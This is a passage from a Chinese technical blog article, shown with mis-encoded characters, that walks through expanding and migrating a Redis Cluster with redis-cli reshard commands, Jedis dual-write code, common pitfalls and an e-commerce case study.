<li><strong>æ— éœ€åœæœï¼Œä¸šåŠ¡æ— æ„ŸçŸ¥</strong>ï¼šè¿ç§»è¿‡ç¨‹å¯¹å®¢æˆ·ç«¯é€æ˜ï¼Œç”¨æˆ·ä½“éªŒä¸å—å½±å“ã€‚</li>
<li><strong>åŠ¨æ€è°ƒæ•´æ§½ä½ï¼Œæ”¯æŒå¼¹æ€§æ‰©å±•</strong>ï¼šæ–°å¢èŠ‚ç‚¹åï¼Œæ§½ä½å¯çµæ´»åˆ†é…ï¼Œé€‚åº”æœªæ¥å¢é•¿ã€‚</li>
<li><strong>å…¼å®¹ç°æœ‰å®¢æˆ·ç«¯</strong>ï¼šæ”¯æŒSmart Clientï¼ˆå¦‚Jedisã€Lettuceï¼‰ï¼Œæ— éœ€é¢å¤–ä»£ç†å±‚ã€‚</li>
</ul>
<p>è¿™äº›ç‰¹æ€§è®©Redis Clusteræˆä¸ºè®¸å¤šå›¢é˜Ÿçš„é¦–é€‰ï¼Œå°¤å…¶é€‚åˆéœ€è¦é«˜å¯ç”¨å’ŒåŠ¨æ€æ‰©å±•çš„åœºæ™¯ã€‚</p>
<h3 data-id="heading-10">2.4 ä¸ä¼ ç»Ÿæ–¹æ¡ˆçš„å¯¹æ¯”</h3>
<p>ä¸ºäº†æ›´ç›´è§‚åœ°ç†è§£Redis Clusterçš„ä»·å€¼ï¼Œæˆ‘ä»¬ä¸å¦¨å¯¹æ¯”ä¸€ä¸‹å…¶ä»–å¸¸è§æ–¹æ¡ˆï¼š</p>





























<table><thead><tr><th><strong>æ–¹æ¡ˆ</strong></th><th><strong>ä¼˜ç‚¹</strong></th><th><strong>ç¼ºç‚¹</strong></th><th><strong>é€‚ç”¨åœºæ™¯</strong></th></tr></thead><tbody><tr><td>å•æœºRedis + ä¸»ä»</td><td>éƒ¨ç½²ç®€å•ï¼Œé€‚åˆå°è§„æ¨¡ä¸šåŠ¡</td><td>å•ç‚¹ç“¶é¢ˆï¼Œä¸»ä»åˆ‡æ¢æœ‰å»¶è¿Ÿé£é™©</td><td>å°å‹é¡¹ç›®ï¼ŒQPS &lt; 1ä¸‡</td></tr><tr><td>ä»£ç†æ¨¡å¼ï¼ˆå¦‚Twemproxyï¼‰</td><td>æ”¯æŒåˆ†ç‰‡ï¼Œå®¢æˆ·ç«¯æ— éœ€æ”¹åŠ¨</td><td>ä»£ç†å±‚å¢åŠ å¤æ‚åº¦ï¼Œæ‰©å®¹éœ€æ‰‹åŠ¨è°ƒæ•´</td><td>ä¸­å‹é¡¹ç›®ï¼Œè¿½æ±‚ç®€å•è¿ç»´</td></tr><tr><td>Redis Cluster</td><td>åŸç”Ÿæ”¯æŒåˆ†ç‰‡ä¸æ‰©å®¹ï¼ŒåŠ¨æ€è°ƒæ•´æ§½ä½</td><td>é…ç½®ç¨å¤æ‚ï¼Œéœ€Smart Clientæ”¯æŒ</td><td>ä¸­å¤§å‹é¡¹ç›®ï¼Œéœ€é«˜å¯ç”¨æ€§</td></tr></tbody></table>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘æ›¾åœ¨æ—©æœŸé¡¹ç›®ä¸­ç”¨Twemproxyåšåˆ†ç‰‡ï¼ŒåˆæœŸæ•ˆæœä¸é”™ï¼Œä½†æ‰©å®¹æ—¶éœ€è¦æ‰‹åŠ¨è°ƒæ•´ä»£ç†é…ç½®ï¼Œæ“ä½œç¹çä¸”å®¹æ˜“å‡ºé”™ã€‚åæ¥åˆ‡æ¢åˆ°Redis Clusterï¼Œè™½ç„¶å‰æœŸå­¦ä¹ æˆæœ¬é«˜ï¼Œä½†åŠ¨æ€æ‰©å®¹çš„ä¾¿åˆ©æ€§è®©æˆ‘å½»åº•â€œè·¯è½¬ç²‰â€ã€‚</p>
<hr/>
<h3 data-id="heading-11">è¿‡æ¸¡åˆ°ä¸‹ä¸€ç« </h3>
<p>é€šè¿‡è¿™ä¸€ç« ï¼Œæˆ‘ä»¬å·²ç»å¯¹Redis Clusterçš„å¹³æ»‘æ‰©å±•æ–¹æ¡ˆæœ‰äº†åˆæ­¥è®¤è¯†ï¼šå®ƒé€šè¿‡æ§½ä½ç®¡ç†å®ç°æ•°æ®åˆ†ç‰‡ï¼Œå€ŸåŠ©åœ¨çº¿è¿ç§»å’ŒåŒå†™ç­–ç•¥ä¿éšœä¸šåŠ¡è¿ç»­æ€§ã€‚ä½†å…‰æœ‰ç†è®ºè¿˜ä¸å¤Ÿï¼Œå¦‚ä½•åœ¨çœŸå®ç¯å¢ƒä¸­è½åœ°æ‰§è¡Œï¼Ÿä¸‹ä¸€ç« å°†è¿›å…¥å®æˆ˜ç¯èŠ‚ï¼Œæˆ‘å°†å¸¦ä½ ä¸€æ­¥æ­¥å®Œæˆä¸€æ¬¡å®Œæ•´çš„Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹æµç¨‹ï¼Œé…ä¸Šä»£ç ç¤ºä¾‹å’Œè¸©å‘ç»éªŒï¼Œç¡®ä¿ä½ èƒ½â€œæ‹¿æ¥å³ç”¨â€ã€‚å‡†å¤‡å¥½åŠ¨æ‰‹å®è·µäº†å—ï¼Ÿè®©æˆ‘ä»¬ç»§ç»­ï¼</p>
<hr/>
<h2 data-id="heading-12">ä¸‰ã€å®æˆ˜ï¼šRedisæ•°æ®è¿ç§»ä¸æ‰©å®¹çš„å®Œæ•´æµç¨‹</h2>
<p>ç†è®ºå·²ç»é“ºå«å¥½äº†ï¼Œç°åœ¨è®©æˆ‘ä»¬å·èµ·è¢–å­ï¼Œè¿›å…¥Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹çš„å®æˆ˜ç¯èŠ‚ã€‚è¿™å°±åƒä¸€åœºç²¾å¿ƒæ’ç»ƒçš„æ‰‹æœ¯ï¼Œæ—¢è¦ç¡®ä¿â€œç—…äººâ€ï¼ˆçº¿ä¸ŠæœåŠ¡ï¼‰å®‰ç„¶æ— æ™ï¼Œåˆè¦è®©â€œæ–°å™¨å®˜â€ï¼ˆèŠ‚ç‚¹ï¼‰æ— ç¼æ¥å…¥ã€‚é€šè¿‡è¿™ä¸€ç« ï¼Œä½ å°†æŒæ¡ä»è§„åˆ’åˆ°æ‰§è¡Œçš„å…¨æµç¨‹ï¼Œå­¦ä¼šå¦‚ä½•åœ¨çœŸå®ç¯å¢ƒä¸­ä¼˜é›…åœ°å®Œæˆä¸€æ¬¡æ‰©å®¹ã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„ç»éªŒæ€»ç»“ï¼Œæ¥è‡ªå¤šæ¬¡é¡¹ç›®å®è·µï¼Œæ¶µç›–å‰ç½®å‡†å¤‡ã€åˆ†æ­¥å®æ–½å’Œæ³¨æ„äº‹é¡¹ã€‚</p>
<h3 data-id="heading-13">3.1 å‰ç½®å‡†å¤‡</h3>
<p>æ‰©å®¹ä¸æ˜¯ä¸´æ—¶èµ·æ„ï¼Œè€Œæ˜¯éœ€è¦å‘¨å¯†çš„è®¡åˆ’ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ul>
<li><strong>å®¹é‡è§„åˆ’</strong>ï¼šé¦–å…ˆè¯„ä¼°å½“å‰é›†ç¾¤è´Ÿè½½å’Œæœªæ¥éœ€æ±‚ã€‚æ¯”å¦‚ï¼Œç°æœ‰3èŠ‚ç‚¹é›†ç¾¤æ¯èŠ‚ç‚¹å†…å­˜å ç”¨60%ï¼ŒQPSå³°å€¼2ä¸‡ï¼Œé¢„è®¡åŠå¹´åQPSç¿»å€ã€‚ä½ å¯ä»¥ç”¨<code>INFO</code>å‘½ä»¤æŸ¥çœ‹å†…å­˜ã€CPUå’Œè¿æ¥æ•°ï¼Œç»“åˆä¸šåŠ¡å¢é•¿æ›²çº¿é¢„ä¼°æ–°èŠ‚ç‚¹æ•°ã€‚</li>
<li><strong>ç¯å¢ƒæ­å»º</strong>ï¼šåœ¨æ–°æœåŠ¡å™¨ä¸Šéƒ¨ç½²Rediså®ä¾‹ï¼Œç¡®ä¿ç‰ˆæœ¬ä¸€è‡´ï¼ˆæ¨è6.0+ä»¥æ”¯æŒæ›´ç¨³å®šçš„é›†ç¾¤åŠŸèƒ½ï¼‰ã€‚é…ç½®æ–‡ä»¶ä¸­å¼€å¯<code>cluster-enabled yes</code>ï¼Œå¹¶æ£€æŸ¥ç½‘ç»œè¿é€šæ€§ã€‚</li>
<li><strong>å·¥å…·é€‰æ‹©</strong>ï¼šæˆ‘å¸¸ç”¨<code>redis-cli --cluster</code>ï¼Œå®ƒç®€å•é«˜æ•ˆï¼Œæ”¯æŒè‡ªåŠ¨åŒ–è¿ç§»ã€‚è€ç‰ˆæœ¬çš„<code>redis-trib.rb</code>ä¹Ÿå¯ä»¥ï¼Œä½†å·²è¢«åºŸå¼ƒã€‚ç¬¬ä¸‰æ–¹å·¥å…·å¦‚RedisShakeé€‚ç”¨äºå¤æ‚åœºæ™¯ï¼ˆå¦‚è·¨äº‘è¿ç§»ï¼‰ï¼Œä½†éœ€æµ‹è¯•å…¼å®¹æ€§ã€‚</li>
</ul>
<p><strong>å°è´´å£«</strong>ï¼šè§„åˆ’æ—¶åˆ«å¿˜äº†ç•™20%-30%çš„ç¼“å†²ç©ºé—´ï¼Œé¿å…æ‰©å®¹åˆšå®Œæˆåˆâ€œçˆ†ä»“â€ã€‚</p>
<h3 data-id="heading-14">3.2 åˆ†æ­¥å®æ–½</h3>
<p>æ¥ä¸‹æ¥æ˜¯å®æ–½è¿‡ç¨‹ï¼Œæˆ‘å°†æ‹†è§£ä¸ºå››ä¸ªæ­¥éª¤ï¼Œæ¯æ­¥é…ä¸Šä»£ç å’Œè¯´æ˜ã€‚</p>
<h4 data-id="heading-15">æ­¥éª¤1ï¼šæ·»åŠ æ–°èŠ‚ç‚¹</h4>
<p>å‡è®¾ç°æœ‰é›†ç¾¤æœ‰3ä¸ªèŠ‚ç‚¹ï¼ˆAã€Bã€Cï¼‰ï¼Œæˆ‘ä»¬è¦åŠ å…¥èŠ‚ç‚¹Dã€‚å…ˆå¯åŠ¨Dçš„Rediså®ä¾‹ï¼Œç„¶åç”¨<code>CLUSTER MEET</code>å°†å…¶æ¥å…¥é›†ç¾¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨èŠ‚ç‚¹Dæ‰§è¡Œï¼Œå‡è®¾èŠ‚ç‚¹Açš„IPä¸º192.168.1.10:6379</span>
redis-cli -h 192.168.1.10 -p 6379 cluster meet 192.168.1.13 6379
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼š<code>CLUSTER MEET</code>ä¼šè§¦å‘èŠ‚ç‚¹æ¡æ‰‹ï¼ŒDåŠ å…¥é›†ç¾¤ä½†æš‚æ— æ§½ä½åˆ†é…ã€‚</li>
<li><strong>éªŒè¯</strong>ï¼šç”¨<code>CLUSTER NODES</code>æ£€æŸ¥Dæ˜¯å¦å‡ºç°åœ¨èŠ‚ç‚¹åˆ—è¡¨ä¸­ã€‚</li>
</ul>
<h4 data-id="heading-16">æ­¥éª¤2ï¼šæ§½ä½è¿ç§»</h4>
<p>æ§½ä½æ˜¯æ•°æ®çš„â€œæ¬è¿å•ä½â€ã€‚å‡è®¾èŠ‚ç‚¹Aæœ‰5461ä¸ªæ§½ä½ï¼ˆ0-5460ï¼‰ï¼Œæˆ‘ä»¬è®¡åˆ’è¿ç§»1000ä¸ªæ§½åˆ°èŠ‚ç‚¹Dï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨ä»»æ„èŠ‚ç‚¹æ‰§è¡Œï¼ŒæŒ‡å®šæºèŠ‚ç‚¹Aå’Œç›®æ ‡èŠ‚ç‚¹D</span>
redis-cli --cluster reshard 192.168.1.10:6379 \
  --cluster-from &lt;èŠ‚ç‚¹Açš„node_id&gt; \
  --cluster-to &lt;èŠ‚ç‚¹Dçš„node_id&gt; \
  --cluster-slots 1000
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼š<code>reshard</code>ä¼šäº¤äº’å¼è¯¢é—®è¿ç§»å“ªäº›æ§½ï¼Œè¾“å…¥<code>yes</code>ç¡®è®¤ã€‚<code>node_id</code>å¯é€šè¿‡<code>CLUSTER NODES</code>è·å–ã€‚</li>
<li><strong>ç›‘æ§</strong>ï¼šç”¨<code>CLUSTER INFO</code>æŸ¥çœ‹è¿ç§»è¿›åº¦ï¼Œç¡®ä¿æ§½çŠ¶æ€ä»<code>migrating</code>å˜ä¸ºç¨³å®šã€‚</li>
</ul>
<p><strong>å®æˆ˜åœºæ™¯</strong>ï¼šè¿ç§»æ—¶å»ºè®®åˆ†æ‰¹è¿›è¡Œï¼Œæ¯”å¦‚æ¯æ¬¡500-1000ä¸ªæ§½ï¼Œé¿å…ä¸€æ¬¡æ€§å ç”¨è¿‡å¤šèµ„æºå¯¼è‡´æ€§èƒ½æŠ–åŠ¨ã€‚</p>
<h4 data-id="heading-17">æ­¥éª¤3ï¼šæ•°æ®åŒæ­¥</h4>
<p>æ§½ä½è¿ç§»åï¼Œæ•°æ®éœ€è¦åŒæ­¥ã€‚ä¸ºä¿è¯ä¸€è‡´æ€§ï¼Œæˆ‘æ¨èåŒå†™ç­–ç•¥ã€‚ä»¥ä¸‹æ˜¯Java Jediså®ç°çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">JedisCluster</span> <span class="hljs-variable">oldCluster</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"192.168.1.10"</span>, <span class="hljs-number">6379</span>));
<span class="hljs-type">JedisCluster</span> <span class="hljs-variable">newCluster</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"192.168.1.13"</span>, <span class="hljs-number">6379</span>));

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dualWrite</span><span class="hljs-params">(String key, String value)</span> {
    <span class="hljs-comment">// åŒæ—¶å†™å…¥æ—§é›†ç¾¤å’Œæ–°é›†ç¾¤</span>
    oldCluster.set(key, value);
    newCluster.set(key, value);
}

<span class="hljs-comment">// æ•°æ®æ ¡éªŒï¼šå¯¹æ¯”ä¸¤è¾¹æ•°æ®</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verifyData</span><span class="hljs-params">(String key)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> oldCluster.get(key);
    <span class="hljs-type">String</span> <span class="hljs-variable">newValue</span> <span class="hljs-operator">=</span> newCluster.get(key);
    <span class="hljs-keyword">return</span> oldValue != <span class="hljs-literal">null</span> &amp;&amp; oldValue.equals(newValue);
}
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼šåŒå†™ç¡®ä¿è¿ç§»æœŸé—´æ•°æ®ä¸€è‡´ã€‚æ ¡éªŒæ—¶å¯æŠ½æ ·æ£€æŸ¥Keyï¼Œé¿å…å…¨é‡æ‰«æå½±å“æ€§èƒ½ã€‚</li>
</ul>
<h4 data-id="heading-18">æ­¥éª¤4ï¼šåˆ‡æ¢ä¸æ¸…ç†</h4>
<p>æ•°æ®åŒæ­¥å®Œæˆåï¼Œæ›´æ–°å®¢æˆ·ç«¯é…ç½®ï¼Œåˆ‡æ¢æµé‡åˆ°æ–°é›†ç¾¤ï¼Œæœ€åç§»é™¤æ—§èŠ‚ç‚¹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># éªŒè¯æ–°é›†ç¾¤çŠ¶æ€</span>
redis-cli --cluster check 192.168.1.13:6379

<span class="hljs-comment"># ç§»é™¤æ—§èŠ‚ç‚¹ï¼ˆå‡è®¾ç§»é™¤èŠ‚ç‚¹Cï¼‰</span>
redis-cli --cluster del-node 192.168.1.12:6379 &lt;èŠ‚ç‚¹Cçš„node_id&gt;
</code></pre>
<ul>
<li><strong>æ³¨é‡Š</strong>ï¼š<code>check</code>ç¡®è®¤æ§½ä½åˆ†é…æ­£å¸¸åï¼Œ<code>del-node</code>æ¸…ç†æ— æ§½èŠ‚ç‚¹ã€‚</li>
</ul>
<h3 data-id="heading-19">3.3 æœ€ä½³å®è·µ</h3>
<p>å®æˆ˜ä¸­ï¼Œæˆ‘æ€»ç»“äº†å‡ ä¸ªç»éªŒï¼š</p>
<ul>
<li><strong>å°æ‰¹é‡è¿ç§»</strong>ï¼šæ¯æ¬¡è¿ç§»å°‘é‡æ§½ï¼ˆ500-1000ï¼‰ï¼Œè§‚å¯Ÿæ€§èƒ½åå†ç»§ç»­ã€‚</li>
<li><strong>ä½¿ç”¨Pipeline</strong>ï¼šæ‰¹é‡æ“ä½œKeyæ—¶ç”¨Pipelineï¼Œå‡å°‘ç½‘ç»œå¼€é”€ã€‚ä¾‹å¦‚ï¼ŒJedisçš„<code>pipeline.sync()</code>å¯æå‡10å€æ•ˆç‡ã€‚</li>
<li><strong>æå‰æµ‹è¯•å·¥å…·</strong>ï¼šä¸åŒç‰ˆæœ¬çš„<code>redis-cli</code>è¡Œä¸ºå¯èƒ½æœ‰å·®å¼‚ï¼Œé¢„æ¼”ä¸€éé¿å…æ„å¤–ã€‚</li>
</ul>
<h3 data-id="heading-20">3.4 è¸©å‘ç»éªŒ</h3>
<h4 data-id="heading-21">æ¡ˆä¾‹1ï¼šç½‘ç»œæŠ–åŠ¨å¯¼è‡´æ§½è¿ç§»å¤±è´¥</h4>
<p>ä¸€æ¬¡è¿ç§»ä¸­ï¼Œå› ç½‘ç»œç¬æ–­ï¼Œéƒ¨åˆ†æ§½çŠ¶æ€å¡åœ¨<code>migrating</code>ï¼Œå®¢æˆ·ç«¯æŠ¥<code>ASK</code>é”™è¯¯ã€‚æ’æŸ¥å‘ç°ç›®æ ‡èŠ‚ç‚¹æœªæ”¶åˆ°å®Œæ•´æ•°æ®ã€‚è§£å†³åŠæ³•æ˜¯ç”¨<code>CLUSTER SETSLOT &lt;slot&gt; NODE &lt;node_id&gt;</code>æ‰‹åŠ¨ä¿®å¤ï¼Œå¹¶é‡è¯•è¿ç§»ã€‚</p>
<h4 data-id="heading-22">æ¡ˆä¾‹2ï¼šå®¢æˆ·ç«¯é…ç½®æœªæ›´æ–°</h4>
<p>åˆ‡æ¢åï¼Œéƒ¨åˆ†å®¢æˆ·ç«¯ä»æŒ‡å‘æ—§èŠ‚ç‚¹ï¼Œå¯¼è‡´è¯·æ±‚å¤±è´¥ã€‚åŸå› æ˜¯æœªåŠæ—¶åˆ·æ–°é…ç½®ã€‚å»ºè®®ç”¨é…ç½®ä¸­å¿ƒï¼ˆå¦‚Apolloï¼‰åŠ¨æ€æ¨é€æ–°åœ°å€ï¼Œå¹¶è®¾ç½®TTLè‡ªåŠ¨è¿‡æœŸæ—§è¿æ¥ã€‚</p>
<hr/>
<h3 data-id="heading-23">è¿‡æ¸¡åˆ°ä¸‹ä¸€ç« </h3>
<p>é€šè¿‡è¿™ä¸€ç« ï¼Œæˆ‘ä»¬å®Œæˆäº†ä¸€æ¬¡ä»è§„åˆ’åˆ°è½åœ°çš„Redisæ‰©å®¹å®æˆ˜ã€‚ä½ æ˜¯å¦å·²ç»è·ƒè·ƒæ¬²è¯•ï¼Œæƒ³åœ¨è‡ªå·±çš„é¡¹ç›®ä¸­å®è·µä¸€ç•ªï¼Ÿåˆ«æ€¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä¼šåˆ†äº«ä¸€ä¸ªçœŸå®é¡¹ç›®æ¡ˆä¾‹ï¼Œå‰–æå¦‚ä½•å°†è¿™äº›æŠ€æœ¯åº”ç”¨åˆ°å¤æ‚åœºæ™¯ä¸­ï¼Œå¹¶æ­ç¤ºæ›´å¤šéšè—çš„ç»†èŠ‚ã€‚å‡†å¤‡å¥½è¿æ¥æ›´æ·±å…¥çš„æŒ‘æˆ˜å§ï¼</p>
<hr/>
<h2 data-id="heading-24">å››ã€çœŸå®é¡¹ç›®æ¡ˆä¾‹åˆ†æ</h2>
<p>ç†è®ºå’Œæ­¥éª¤éƒ½è®²å®Œäº†ï¼Œä½†æŠ€æœ¯çœŸæ­£çš„ä»·å€¼è¿˜æ˜¯è¦é€šè¿‡å®è·µæ¥æ£€éªŒã€‚è¿™ä¸€ç« ï¼Œæˆ‘å°†åˆ†äº«ä¸€ä¸ªçœŸå®çš„ç”µå•†é¡¹ç›®æ¡ˆä¾‹ï¼Œå¸¦ä½ çœ‹çœ‹Redisè¿ç§»ä¸æ‰©å®¹å¦‚ä½•åœ¨é«˜å¹¶å‘åœºæ™¯ä¸­è½åœ°ã€‚ä»é¡¹ç›®èƒŒæ™¯åˆ°å®æ–½ç»†èŠ‚ï¼Œå†åˆ°æˆæœä¸åæ€ï¼Œå¸Œæœ›èƒ½è®©ä½ æ„Ÿå—åˆ°è¿™åœºâ€œæ‰©å®¹ä¹‹æ—…â€çš„çœŸå®æ¸©åº¦ã€‚</p>
<h3 data-id="heading-25">4.1 é¡¹ç›®èƒŒæ™¯</h3>
<p>è¿™æ˜¯ä¸€ä¸ªç”µå•†å¹³å°çš„è®¢å•ç¼“å­˜ç³»ç»Ÿï¼Œè´Ÿè´£å­˜å‚¨ç”¨æˆ·çš„è´­ç‰©è½¦å’Œè®¢å•çŠ¶æ€ã€‚æœ€åˆçš„æ¶æ„æ˜¯3èŠ‚ç‚¹ä¸»ä»Redisï¼ˆ1ä¸»2ä»ï¼‰ï¼Œæ¯èŠ‚ç‚¹é…ç½®16GBå†…å­˜ï¼Œå³°å€¼QPSçº¦1ä¸‡ï¼Œå¹³å‡å»¶è¿Ÿ10msã€‚éšç€ä¸šåŠ¡æ‰©å±•ï¼Œå°¤å…¶æ˜¯å¤§ä¿ƒæ´»åŠ¨æœŸé—´ï¼ŒQPSæ¿€å¢åˆ°10ä¸‡ï¼Œçƒ­ç‚¹Keyï¼ˆå¦‚çˆ†æ¬¾å•†å“çš„åº“å­˜ï¼‰å¯¼è‡´ä¸»èŠ‚ç‚¹è´Ÿè½½é£™å‡ï¼Œå»¶è¿Ÿå‡è‡³20msï¼Œç”šè‡³å¶ç°è¶…æ—¶ã€‚å›¢é˜Ÿå†³å®šå‡çº§åˆ°6èŠ‚ç‚¹Redis Clusterï¼Œæ—¢æå‡å®¹é‡ï¼Œåˆè§£å†³çƒ­ç‚¹é—®é¢˜ã€‚</p>
<ul>
<li><strong>åŸæ¶æ„</strong>ï¼š3èŠ‚ç‚¹ä¸»ä»ï¼ˆ192.168.1.10-12:6379ï¼‰ã€‚</li>
<li><strong>ç›®æ ‡æ¶æ„</strong>ï¼š6èŠ‚ç‚¹é›†ç¾¤ï¼ˆæ–°å¢192.168.1.13-15:6379ï¼‰ã€‚</li>
<li><strong>æŒ‘æˆ˜</strong>ï¼šä¸åœæœè¿ç§»ï¼Œä¿æŒæ•°æ®ä¸€è‡´æ€§ï¼Œé™ä½å»¶è¿Ÿã€‚</li>
</ul>
<h3 data-id="heading-26">4.2 å®æ–½è¿‡ç¨‹</h3>
<h4 data-id="heading-27">å®¹é‡è¯„ä¼°ä¸æ§½ä½é‡æ–°åˆ†é…</h4>
<p>æˆ‘ä»¬å…ˆç”¨<code>INFO MEMORY</code>å’Œ<code>INFO STATS</code>åˆ†æç°æœ‰è´Ÿè½½ï¼Œå‘ç°ä¸»èŠ‚ç‚¹å†…å­˜å ç”¨75%ï¼Œä»èŠ‚ç‚¹åŸºæœ¬é—²ç½®ï¼ŒQPSç“¶é¢ˆåœ¨ä¸»èŠ‚ç‚¹çš„CPUã€‚å¤§ä¿ƒé¢„è®¡QPSç¿»å€ï¼Œå†…å­˜éœ€æ±‚å¢è‡³40GBã€‚æŒ‰æ¯èŠ‚ç‚¹16GBè®¡ç®—ï¼Œ6èŠ‚ç‚¹é›†ç¾¤èƒ½æ»¡è¶³éœ€æ±‚ï¼Œä¸”ç•™æœ‰ä½™é‡ã€‚</p>
<p>æ§½ä½åˆ†é…ä¸Šï¼ŒåŸ3èŠ‚ç‚¹å¹³å‡æ¯èŠ‚ç‚¹5461ä¸ªæ§½ï¼ˆ16384 Ã· 3ï¼‰ï¼Œæ‰©å®¹åè°ƒæ•´ä¸ºæ¯èŠ‚ç‚¹2730ä¸ªæ§½ï¼ˆ16384 Ã· 6ï¼‰ã€‚ä¸ºé¿å…çƒ­ç‚¹ï¼Œæˆ‘ä»¬åˆ†æäº†Keyåˆ†å¸ƒï¼Œå°†é«˜é¢‘è®¿é—®çš„å•†å“IDæ§½ä½åˆ†æ•£åˆ°ä¸åŒèŠ‚ç‚¹ã€‚</p>
<h4 data-id="heading-28">æ•°æ®è¿ç§»çš„å…·ä½“æ“ä½œ</h4>
<ol>
<li>
<p><strong>åŠ å…¥æ–°èŠ‚ç‚¹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli -h 192.168.1.10 -p 6379 cluster meet 192.168.1.13 6379
redis-cli -h 192.168.1.10 -p 6379 cluster meet 192.168.1.14 6379
redis-cli -h 192.168.1.10 -p 6379 cluster meet 192.168.1.15 6379
</code></pre>
<ul>
<li><strong>éªŒè¯</strong>ï¼š<code>CLUSTER NODES</code>æ˜¾ç¤º6ä¸ªèŠ‚ç‚¹å·²è¿æ¥ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ§½ä½è¿ç§»</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli --cluster reshard 192.168.1.10:6379 \
  --cluster-from &lt;èŠ‚ç‚¹Açš„node_id&gt; \
  --cluster-to &lt;èŠ‚ç‚¹Dçš„node_id&gt; \
  --cluster-slots 2730
</code></pre>
<ul>
<li><strong>æ‰§è¡Œ</strong>ï¼šåˆ†3æ¬¡è¿ç§»ï¼Œæ¯æ¬¡è¿ç§»900-1000ä¸ªæ§½ï¼Œè§‚å¯ŸCPUå’Œç½‘ç»œè´Ÿè½½ã€‚</li>
<li><strong>ç›‘æ§</strong>ï¼šç”¨<code>CLUSTER INFO</code>ç¡®è®¤æ§½ä½çŠ¶æ€ç¨³å®šã€‚</li>
</ul>
</li>
<li>
<p><strong>æ•°æ®åŒæ­¥ä¸åŒå†™</strong>ï¼š
å®¢æˆ·ç«¯ç”¨Jediså®ç°åŒå†™ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">JedisCluster</span> <span class="hljs-variable">oldCluster</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"192.168.1.10"</span>, <span class="hljs-number">6379</span>));
<span class="hljs-type">JedisCluster</span> <span class="hljs-variable">newCluster</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"192.168.1.13"</span>, <span class="hljs-number">6379</span>));

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveOrder</span><span class="hljs-params">(String orderId, String data)</span> {
    oldCluster.setex(orderId, <span class="hljs-number">3600</span>, data); <span class="hljs-comment">// æ—§é›†ç¾¤ï¼ŒTTL 1å°æ—¶</span>
    newCluster.setex(orderId, <span class="hljs-number">3600</span>, data); <span class="hljs-comment">// æ–°é›†ç¾¤</span>
}
</code></pre>
<ul>
<li><strong>æ ¡éªŒ</strong>ï¼šæŠ½æŸ¥1000ä¸ªKeyï¼Œç¡®ä¿ä¸¤è¾¹ä¸€è‡´ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç°åº¦åˆ‡æ¢</strong>ï¼š</p>
<ul>
<li>å…ˆå°†10%æµé‡åˆ‡åˆ°æ–°é›†ç¾¤ï¼Œè§‚å¯Ÿå»¶è¿Ÿå’Œé”™è¯¯ç‡ã€‚</li>
<li>é€æ­¥æå‡åˆ°100%ï¼Œç”¨é…ç½®ä¸­å¿ƒæ¨é€æ–°é›†ç¾¤åœ°å€ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-29">åœ¨çº¿éªŒè¯ä¸æ¸…ç†</h4>
<p>åˆ‡æ¢åï¼Œç”¨<code>redis-cli --cluster check</code>éªŒè¯æ§½ä½åˆ†å¸ƒï¼Œæ–°é›†ç¾¤è¿è¡Œæ­£å¸¸ã€‚æ—§ä»èŠ‚ç‚¹ï¼ˆ192.168.1.11-12ï¼‰æ— æ§½ä½åç§»é™¤ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">redis-cli --cluster del-node 192.168.1.11:6379 &lt;node_id&gt;
</code></pre>
<h3 data-id="heading-30">4.3 æˆæœä¸åæ€</h3>
<h4 data-id="heading-31">æˆæœ</h4>
<ul>
<li><strong>æ€§èƒ½æå‡</strong>ï¼šQPSä»1ä¸‡å‡è‡³10ä¸‡ï¼Œå»¶è¿Ÿä»20msé™è‡³5msï¼Œé›†ç¾¤è´Ÿè½½å‡è¡¡ã€‚</li>
<li><strong>å®¹é‡æ‰©å±•</strong>ï¼šå†…å­˜ä»48GBï¼ˆ3Ã—16ï¼‰å¢è‡³96GBï¼ˆ6Ã—16ï¼‰ï¼Œæ”¯æŒæœªæ¥6ä¸ªæœˆå¢é•¿ã€‚</li>
